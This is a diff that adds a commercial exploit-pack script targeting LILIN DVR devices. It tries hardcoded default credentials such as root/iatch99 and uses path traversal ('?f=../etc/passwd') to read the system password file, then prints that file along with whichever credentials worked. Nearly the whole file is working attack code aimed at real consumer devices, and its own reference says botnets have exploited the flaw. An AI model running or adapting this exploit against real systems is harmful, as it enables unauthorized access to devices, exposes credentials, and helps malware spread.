@@ -1,0 +1,49 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_lilin_1'
+_vendor_ = 'lilin'
+_model_  = ['DHD516A', 'DHD508A', 'DHD504A', 'DHD316A', 'DHD308A', 'DHD304A', 'DHD204', 'DHD204A', 'DHD208', 'DHD208A', 'DHD216', 'DHD216A']
+_vuln_   = 'Path Traversal Vulnerability'
+_cve_    = ''
+_ref_    = 'https://blog.netlab.360.com/multiple-botnets-are-spreading-using-lilin-dvr-0-day-en/'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  auths = [
+    ('root', 'iatch99'),
+    ('report', '8Jg0SR8K50'),
+    ('admin', '123456')
+  ]
+  
+  for auth in auths:
+    try:
+      url = 'http://%s:%d/?f=../etc/passwd' % (host,port)              
+      response = requests.get(url, auth=auth)      
+    except Exception, e:
+      print '[-] error : %s' % e
+      continue
+    if response is None:
+      print '[+] %s not vulnerable' % host
+    if 'root:' in response.text:
+      print '[+] %s vulnerable with following credentials: %s/%s\n' % (host, auth[0], auth[1])
+      print response.text
+      break
+    else:
+      print '[+] %s not vulnerable with following credentials: %s/%s' % (host, auth[0], auth[1])      
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
